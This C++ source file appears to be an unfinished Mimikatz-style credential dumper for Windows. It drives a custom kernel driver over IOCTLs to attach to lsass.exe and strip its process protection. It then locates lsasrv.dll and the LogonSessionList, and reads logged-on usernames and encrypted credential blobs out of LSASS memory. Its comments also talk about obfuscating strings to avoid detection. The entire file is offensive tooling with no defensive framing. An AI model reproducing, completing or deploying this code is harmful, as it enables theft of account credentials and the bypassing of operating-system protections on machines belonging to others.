#include "mimikatz_userland.h"


//To DO: Edit reg keys and remove LSA Protection or just modify mem here..?

//Target Process
const wchar_t* wProc = L"lsass.exe";
const wchar_t* wTargetDLL = L"C:\\Windows\\system32\\lsasrv.dll";


//Function definition for NtQueryInformationProcess
typedef NTSTATUS(NTAPI* fnNtQuerySystemInformation)(
	SYSTEM_INFORMATION_CLASS SystemInformationClass,
	PVOID SystemInformation,
	ULONG SystemInformationLength,
	PULONG ReturnLength
	);


//Needed for locating TEB/PEB -> Loaded structs -> creds in lsasrv.dll
typedef NTSTATUS(NTAPI* fnNtQueryInformationProcess)(
	HANDLE ProcessHandle,              // Handle to the process
	PROCESSINFOCLASS ProcessInformationClass,  // Type of information to retrieve
	PVOID ProcessInformation,          // Pointer to buffer to receive info
	ULONG ProcessInformationLength,    // Size of buffer
	PULONG ReturnLength                // Optional: bytes returned
	);



//We need the IOCTL and Request struct.
namespace driver {
	namespace codes {
		//IOCTL codes - drivers to communicate w/ usermode apps and vice versa. 
		//UserMode applications call DeviceIoControl to send a struct -> drivers.
		//Then we recieve the struct and do whatever we want with it.


		//Must be buffered IO so we can send buffers between kernel and userland.

		constexpr ULONG attach = CTL_CODE(FILE_DEVICE_UNKNOWN, 0x696, METHOD_BUFFERED, FILE_SPECIAL_ACCESS); //setup the driver

		constexpr ULONG read = CTL_CODE(FILE_DEVICE_UNKNOWN, 0x697, METHOD_BUFFERED, FILE_SPECIAL_ACCESS); //read process mem

		constexpr ULONG write = CTL_CODE(FILE_DEVICE_UNKNOWN, 0x698, METHOD_BUFFERED, FILE_SPECIAL_ACCESS); //write process mem.

		constexpr ULONG getProtection = CTL_CODE(FILE_DEVICE_UNKNOWN, 0x699, METHOD_BUFFERED, FILE_SPECIAL_ACCESS); //retreieve protections on process  process mem.

		constexpr ULONG unprotect = CTL_CODE(FILE_DEVICE_UNKNOWN, 0x700, METHOD_BUFFERED, FILE_SPECIAL_ACCESS); //unprotect process mem.

		constexpr ULONG protect = CTL_CODE(FILE_DEVICE_UNKNOWN, 0x701, METHOD_BUFFERED, FILE_SPECIAL_ACCESS); //protect process mem.

		constexpr ULONG lssl = CTL_CODE(FILE_DEVICE_UNKNOWN, 0x702, METHOD_BUFFERED, FILE_SPECIAL_ACCESS); //protect process mem.
		
		constexpr ULONG extract = CTL_CODE(FILE_DEVICE_UNKNOWN, 0x703, METHOD_BUFFERED, FILE_SPECIAL_ACCESS); //protect process mem.

	}

	struct Request {
		HANDLE hPID; //
		PVOID pTargetMemory; //victim process
		PVOID pBuffer;
		SIZE_T sSize;
		SIZE_T sReturn_size;
		PVOID pBase;
		PVOID pEnd;
		//ULONG_PTR offset; //FIND ITS IN DRIVER BUT CANT PASS TO USERMODE?
		PVOID pattern;
	};

	bool attachToProcess(const DWORD PID, HANDLE hDriver) {
		Request req;
		req.hPID = (HANDLE)(PID); //because the function in kernel land wants a handle of the PID...
		return DeviceIoControl(hDriver, codes::attach, &req, sizeof(req), &req, sizeof(req), nullptr, nullptr);
	}
	template <class T>
	T readMemory(HANDLE hDriver, const std::uintptr_t addr) {
		T temp = {};
		Request req;
		req.pTargetMemory = reinterpret_cast<PVOID>(addr);
		req.pBuffer = &temp; //result of MmCopyVritualMemory call goes in here hence the template cos the typing may be weird.
		req.sSize = sizeof(T);
		DeviceIoControl(hDriver, codes::read, &req, sizeof(req), &req, sizeof(req), nullptr, nullptr);
		return temp; //return this back to the driver.
	}
	template <class T>
	void writeMemory(HANDLE hDriver, const std::uintptr_t addr, const T& value) {
		Request req;
		req.pTargetMemory = reinterpret_cast<PVOID>(addr);
		req.pBuffer = (PVOID)&value;
		req.sSize = sizeof(T);
		DeviceIoControl(hDriver, codes::write, &req, sizeof(req), &req, sizeof(req), nullptr, nullptr);
	}

	bool unprotect(HANDLE hDriver) {
		Request req;
		return DeviceIoControl(hDriver, codes::unprotect, &req, sizeof(req), &req, sizeof(req), nullptr, nullptr);
	}

	PVOID findLogonSessionList(HANDLE hDriver, PVOID pBase, PVOID pEnd) {
		Request req;
		req.pBase = pBase;
		req.pEnd = pEnd;

		printf("Base: 0x%p\n", req.pBase);
		printf("End : 0x%p\n", req.pEnd);

		req.pattern = NULL;
		DeviceIoControl(hDriver, codes::lssl, &req, sizeof(req), &req, sizeof(req), nullptr, nullptr);
		if (req.pattern == NULL) {
			printf("DeviceIoControl error getting pLssl,,.,.\n");
		}
		printf("Pattern @ 0x%p\n", req.pattern);
		return req.pattern;
	}
	bool extract(HANDLE hDriver, PVOID pBase) {
		Request req;
		req.pBase = pBase;
		printf("Base of LogonSessionList with Offset: 0x%p\n", req.pBase);
		DeviceIoControl(hDriver, codes::extract, &req, sizeof(req), &req, sizeof(req), nullptr, nullptr);
		return true;


	}
}


bool GetRemoteProcessHandle(HANDLE* hTarget, DWORD* PID) {

	HMODULE hNtdll = GetModuleHandleA("ntdll.dll"); //i know these strings r baddddd
	fnNtQuerySystemInformation pNtQuerySystemInformation = NULL;


	if (!hNtdll) {
		printf("Failure finding module...");
		return false;
	}
	pNtQuerySystemInformation = (fnNtQuerySystemInformation)GetProcAddress(hNtdll, "NtQuerySystemInformation"); //i should probabyl do some kind fo encoding for this..

	if (!pNtQuerySystemInformation) {
		printf("Failure finding fucntions...");
		return false;
	}

	ULONG ReturnLength1 = 0x00; //needed buffer size for systemprocessinformation buffer
	ULONG ReturnLengthSystemInfo = 0x00; //actual returned buffer size for systemprocess information
	//first call tells us how big it needs to be..
	pNtQuerySystemInformation(SystemProcessInformation, NULL, NULL, &ReturnLength1); //Now we're getting system proc info..

	//Second call populates..
	PSYSTEM_PROCESS_INFORMATION pSystemProcessInformation = (PSYSTEM_PROCESS_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (SIZE_T)ReturnLength1);

	NTSTATUS status = pNtQuerySystemInformation(SystemProcessInformation, pSystemProcessInformation, ReturnLength1, &ReturnLengthSystemInfo); //Now we're getting system proc info..

	if (!pSystemProcessInformation && status != 0x00) {
		printf("SystemProcessInformation is empty...");
		return 0;
	}


	while (true) {
		if (pSystemProcessInformation->ImageName.Length && wcscmp(pSystemProcessInformation->ImageName.Buffer, wProc) == 0) { //make sure the process ahs a name 
			// openning a handle to the target process and saving it, then breaking 
			wprintf(L"[i] Process \"%s\" - Of Pid : %d \n", pSystemProcessInformation->ImageName.Buffer, pSystemProcessInformation->UniqueProcessId);
			*hTarget = OpenProcess(PROCESS_CREATE_PROCESS | PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, (DWORD)pSystemProcessInformation->UniqueProcessId);
			*PID = (DWORD)pSystemProcessInformation->UniqueProcessId;
			break;
		}

		if (!pSystemProcessInformation->NextEntryOffset) {
			printf("Broken?");
			break;
		}
		// moving to the next element in the array
		pSystemProcessInformation = (PSYSTEM_PROCESS_INFORMATION)((ULONG_PTR)pSystemProcessInformation + pSystemProcessInformation->NextEntryOffset);
	}


	//shift to PEB stuff...
	//https://learn.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntqueryinformationprocess?redirectedfrom=MSDN



	return true;
}

static BOOL ReadUnicodeStringRemote(
	HANDLE hProc, const UNICODE_STRING* us, wchar_t* buf, size_t cchBuf)
{
	if (!us->Buffer || us->Length == 0) { buf[0] = L'\0'; return TRUE; }
	SIZE_T toRead = min((SIZE_T)us->Length, (cchBuf - 1) * sizeof(WCHAR));
	if (!ReadProcessMemory(hProc, us->Buffer, buf, toRead, NULL)) return FALSE;
	buf[toRead / sizeof(WCHAR)] = L'\0';
	return TRUE;
}


bool findLsasrv(HANDLE hTarget, PEB peb, PVOID* pTargetModuleBase, ULONG* pSize) {
	*pTargetModuleBase = NULL;
	printf("In NTLM\n");

	wprintf(L"SEARCHING FOR: %s\n", wTargetDLL);

	// 3) Read remote PEB_LDR_DATA
	PEB_LDR_DATA ldr = { 0 };
	printf("In NTLM\n");
	if (!ReadProcessMemory(hTarget, peb.Ldr, &ldr, sizeof(ldr), NULL)) {
		printf("LDR\n");
		return FALSE;
	}

	printf("retrieved remote head entry addr\n");


	// 4) Compute remote address of list head (InMemoryOrderModuleList)
	//    and read the head LIST_ENTRY
	const BYTE* remoteLdrBase = (const BYTE*)peb.Ldr;
	const BYTE* remoteHeadAddr = remoteLdrBase + offsetof(PEB_LDR_DATA, InMemoryOrderModuleList);

	LIST_ENTRY headLE = { 0 };
	if (!ReadProcessMemory(hTarget, remoteHeadAddr, &headLE, sizeof(headLE), NULL)) {
		printf("headLE\n");
		return false;
	}
	printf("retrieved remote head entry addr\n");

	// 5) Iterate: remoteCurrent points to a remote LIST_ENTRY
	const LIST_ENTRY* remoteCurrentAddr = headLE.Flink;
	printf("Out of while loops\n");
	while (remoteCurrentAddr != (const LIST_ENTRY*)remoteHeadAddr) {
		// Read the current remote LIST_ENTRY
		LIST_ENTRY curLE = { 0 };
		if (!ReadProcessMemory(hTarget, remoteCurrentAddr, &curLE, sizeof(curLE), NULL))
			break;

		// Compute the remote address of the containing LDR_DATA_TABLE_ENTRY:
		//   entryAddr = remoteCurrentAddr - offsetof(LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks)
		const BYTE* remoteEntryAddr =
			(const BYTE*)remoteCurrentAddr - offsetof(LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);

		// Read only the fields we need from the entry to keep it robust
		struct {
			LIST_ENTRY InLoadOrderLinks;
			LIST_ENTRY InMemoryOrderLinks;
			LIST_ENTRY InInitializationOrderLinks;
			PVOID      DllBase;
			PVOID      EntryPoint;
			ULONG      SizeOfImage;
			UNICODE_STRING FullDllName;
			UNICODE_STRING BaseDllName;
		} entry;

		if (!ReadProcessMemory(hTarget, remoteEntryAddr, &entry, sizeof(entry), NULL))
			break;

		// Read the UNICODE_STRING buffer (full path)
		wchar_t fullPath[MAX_PATH * 4]; // large enough for winSxS paths
		if (!ReadUnicodeStringRemote(hTarget, &entry.FullDllName, fullPath, _countof(fullPath)))
			fullPath[0] = L'\0';

		// Debug print
		wprintf(L"Reading %s\n", fullPath);

		// Compare
		if (_wcsicmp(fullPath, wTargetDLL) == 0) {
			*pTargetModuleBase = entry.DllBase;
			*pSize = entry.SizeOfImage;
			printf("MODULE FOUND!!!\n");
			return TRUE;
		}
		// Advance: move to next node using the pointer we just read into curLE
		remoteCurrentAddr = curLE.Flink;
	}

	return FALSE;
}

bool locatePEB(HANDLE hTarget, PVOID* pPEB) {
	HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
	if (!hNtdll) return false;

	printf("NTDLL Handle\n");
	fnNtQueryInformationProcess pNtQueryInformationProcess = (fnNtQueryInformationProcess)GetProcAddress(hNtdll, "NtQueryInformationProcess");
	if (!pNtQueryInformationProcess) return false;

	PROCESS_BASIC_INFORMATION pProcBasicInfo = { 0 };
	ULONG ulRetLength = 0;

	NTSTATUS status = pNtQueryInformationProcess(hTarget, ProcessBasicInformation, &pProcBasicInfo, sizeof(PROCESS_BASIC_INFORMATION), &ulRetLength);

	if (!NT_SUCCESS(status)) {
		return false;
	}
	printf("pointing pPEB\n");

	*pPEB = pProcBasicInfo.PebBaseAddress;  // remote PEB address>????
	printf("pPEB pointed???????\n");
	return true;
}

PLIST_ENTRY LogonSessionList;
PULONG LogonSessionListCount;

typedef struct _LSA_LOGON_SESSION {
	LIST_ENTRY ListEntry;     // 0x0
	char padding[0x90 - sizeof(LIST_ENTRY)]; // pad up to 0x90
	UNICODE_STRING UserName;  // 0x90
	UNICODE_STRING Domain;    // 0xa0
} LSA_LOGON_SESSION;



void decryptBlob(HANDLE hTarget) {

}
void getSecurityBlob(HANDLE hTarget, PVOID pLogonSessionList) {

	// Step 1: read the head pointer (points into LSASS memory)
	PKIWI_MSV1_0_LIST_63 headPtr = NULL;
	if (!ReadProcessMemory(hTarget, pLogonSessionList, &headPtr, sizeof(headPtr), NULL) || !headPtr) {
		printf("[-] Failed to read head pointer\n");
		return;
	}

	// Step 2: read the head node structure
	KIWI_MSV1_0_LIST_63 head = { 0 };
	if (!ReadProcessMemory(hTarget, headPtr, &head, sizeof(head), NULL)) {
		printf("[-] Failed to read head struct\n");
		return;
	}

	// Step 3: iterate the linked list
	PKIWI_MSV1_0_LIST_63 current = head.Flink;
	while (current && current != headPtr) {
		KIWI_MSV1_0_LIST_63 node = { 0 };
		if (!ReadProcessMemory(hTarget, current, &node, sizeof(node), NULL)) {
			printf("[-] Failed to read node @ %p\n", current);
			break;
		}
		printf("\n\nLOCAL KIWI STRUCT 0x%p\n", &node);

		printf("Attempting to read security blob\n");
		if (node.Credentials) { // base + 0x108
			printf("Pointer to KIWI_MSV1_0_CREDENTIALS found at: 0x%p\n", node.Credentials);
			KIWI_MSV1_0_CREDENTIALS Credentials = { 0 };
			if (ReadProcessMemory(hTarget, node.Credentials, &Credentials, sizeof(KIWI_MSV1_0_CREDENTIALS), NULL)) { //place struct in at this address
				printf("REMOTE Pointer to KIWI_MSV1_0_CREDENTIALS found at: 0x%p\n", node.Credentials);
				printf("local Pointer to KIWI_MSV1_0_CREDENTIALS found at: 0x%p\n", &Credentials);

				//read local address for new pointer
				PKIWI_MSV1_0_PRIMARY_CREDENTIALS pPrimaryCredentials = Credentials.PrimaryCredentials;
				KIWI_MSV1_0_PRIMARY_CREDENTIALS PrimaryCredentials = { 0 };
				getchar();
				if (ReadProcessMemory(hTarget, pPrimaryCredentials, &PrimaryCredentials, sizeof(KIWI_MSV1_0_PRIMARY_CREDENTIALS), NULL)) {
					LSA_UNICODE_STRING LsaUnicodeString = PrimaryCredentials.Credentials;
					wchar_t blob[0x1B0] = { 0 }; //size of blob = 0x1B0
					SIZE_T bytesToRead = min(LsaUnicodeString.Length, sizeof(blob) - sizeof(wchar_t));
					if (ReadProcessMemory(hTarget, LsaUnicodeString.Buffer, blob, bytesToRead, NULL)) {
						// Length is in bytes, so divide by sizeof(WCHAR)
						wprintf(L"[+] Security Blob: %.*s\n", LsaUnicodeString.Length / sizeof(WCHAR), blob);
						//decryptBlob(blob);
					}
					else {
						printf("[-] Failed to read Lsa Unicode String buffer @ %p\n",LsaUnicodeString.Buffer);
					}
				}
				printf("\n");
			}
		}
		else {
			printf("Error reading Credentials struct");
		}
	}
}

void userlandExtraction(HANDLE hTarget, PVOID pLogonSessionList) {
	// Step 1: read the head pointer (points into LSASS memory)
	PKIWI_MSV1_0_LIST_63 headPtr = NULL;
	if (!ReadProcessMemory(hTarget, pLogonSessionList, &headPtr, sizeof(headPtr), NULL) || !headPtr) {
		printf("[-] Failed to read head pointer\n");
		return;
	}

	// Step 2: read the head node structure
	KIWI_MSV1_0_LIST_63 head = { 0 };
	if (!ReadProcessMemory(hTarget, headPtr, &head, sizeof(head), NULL)) {
		printf("[-] Failed to read head struct\n");
		return;
	}

	// Step 3: iterate the linked list
	PKIWI_MSV1_0_LIST_63 current = head.Flink;
	while (current && current != headPtr) {
		KIWI_MSV1_0_LIST_63 node = { 0 };
		if (!ReadProcessMemory(hTarget, current, &node, sizeof(node), NULL)) {
			printf("[-] Failed to read node @ %p\n", current);
			break;
		}
		printf("KIWI STRUCT 0x%p\n", node);
		printf("Username Buffer 0x%p", node.UserName.Buffer);


		// Step 4: read the username if present
		if (node.UserName.Buffer && node.UserName.Length > 0) {
			wchar_t buffer[256] = { 0 };
			SIZE_T bytesToRead = min(node.UserName.Length, sizeof(buffer) - sizeof(wchar_t));

			if (ReadProcessMemory(hTarget, node.UserName.Buffer, buffer, bytesToRead, NULL)) {
				// Length is in bytes, so divide by sizeof(WCHAR)
				wprintf(L"[+] Username: %.*s\n", node.UserName.Length / sizeof(WCHAR), buffer);
			}
			else {
				printf("[-] Failed to read username buffer @ %p\n", node.UserName.Buffer);
			}

		}
		else {
			printf("[*] NO USERNAME\n");
		}
		// Step 5: advance
		current = node.Flink;
	}
}

uintptr_t get_rip_relative_address(uint8_t* instr)
{
	// instr points to the LEA instruction (0x48 0x8d 0x0d ...)
	int32_t offset;
	// offset is at bytes 3..6 (little endian)
	offset = *(int32_t*)(instr + 3);

	// RIP is the address of the next instruction
	uintptr_t rip = (uintptr_t)(instr + 7);

	return rip + offset;
}




int main(int argc, wchar_t* argv[]) {
	//Driver stuf...

	const HANDLE hDriver = CreateFile(L"\\\\.\\noah", GENERIC_READ, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);

	if (hDriver == INVALID_HANDLE_VALUE) {
		printf("ERROR W DRIVER HANDLE");
		return 1;
	}

	DWORD TargetPID;
	HANDLE hTarget;

	if (!GetRemoteProcessHandle(&hTarget, &TargetPID)) {
		printf("Failed to get process handle!\n");
		return 0;
	}

	PVOID pERPROCESS = NULL;

	//Driver is attaching to target process via PID.
	if (driver::attachToProcess(TargetPID, hDriver) == true) {
		printf("Attached!\n");
	}


	//Driver is now attached and we need to parse through process memory.

	if (driver::unprotect(hDriver) == true) {
		printf("Removed protections from target process...\n");
	}



	//PVOID pEPROCESS = driver::getEPROCESS(hDriver);

	//printf("EPROCESS found at 0x%p....\n", pEPROCESS);

	//Retr EPROCESS


	//Now that process protections are disabled we can ready process memory from userland.

	//Step 1. Locate PEB
	PVOID pRemotePEB;
	PEB pLocalPEBofRemotePEB;

	if (!locatePEB(hTarget, &pRemotePEB)) {
		printf("locatePEB failed\n");
		return 1;
	}
	SIZE_T sBytesTransferred = 0;

	if (!ReadProcessMemory(hTarget, pRemotePEB, &pLocalPEBofRemotePEB, sizeof(PEB), &sBytesTransferred)) {
		printf("transfering PEB remote to local error\n");
	}

	printf("PEB Pointer found\n");

	printf("Bytes: %zu\n", sBytesTransferred);

	PVOID pLsasrv = NULL;
	ULONG uSize = NULL;
	printf("Outside NTLM\n");
	findLsasrv(hTarget, pLocalPEBofRemotePEB, &pLsasrv, &uSize);

	HMODULE hLsasrv = NULL;
	SIZE_T sLsasrv;
	if (!ReadProcessMemory(hTarget, pLsasrv, &hLsasrv, sizeof(HMODULE), &sLsasrv)) {
		printf("Error reading lsasrv.dll from lsass...\n");
	}
	PVOID pLsl = NULL;
	PVOID pEnd = (BYTE*)pLsasrv + (SIZE_T)uSize;

	pLsl = (BYTE*)driver::findLogonSessionList(hDriver, pLsasrv, pEnd);

	// JE instruction lives at offset +0x14
	PVOID pLslActual = (PVOID)((BYTE*)pLsl + 0x14); //offset to 00007ffd`fc17e398 488d0d915b1200  lea     rcx,[lsasrv!LogonSessionList (00007ffd`fc2a3f30)] lea instruction to retr address

	BYTE leaBytes[7];
	SIZE_T bytesRead;
	UINT64 target;

	if (!ReadProcessMemory(hTarget, pLslActual, leaBytes, sizeof(leaBytes), &bytesRead) || bytesRead != sizeof(leaBytes)) {
		printf("Failed to read remote memory. Error: %lu\n", GetLastError());
		CloseHandle(hTarget);
		return 1;
	}
	if (bytesRead == sizeof(leaBytes) && leaBytes[0] == 0x48 && leaBytes[1] == 0x8D && leaBytes[2] == 0x0D) {
		// extract displacement
		int32_t disp32 = *(int32_t*)&leaBytes[3];

		// next instruction is leaAddr + 7
		UINT64 nextInstr = (UINT64)pLslActual + 7;

		target = nextInstr + disp32;

		printf("RIP-relative target = 0x%llx\n", target); //i need to learn how this shit works like actually cos this is so confusing.
	}

	printf("Offset of Credentials = 0x%zx\n",offsetof(KIWI_MSV1_0_LIST_63, Credentials)); //offset A0?
	PVOID pLogonSessionList = (PVOID)(uintptr_t)target;

	userlandExtraction(hTarget, (PVOID)pLogonSessionList);
	getSecurityBlob(hTarget, (PVOID)pLogonSessionList);

	getchar();
	std::cout << "Hello world\n";

	return 0;
}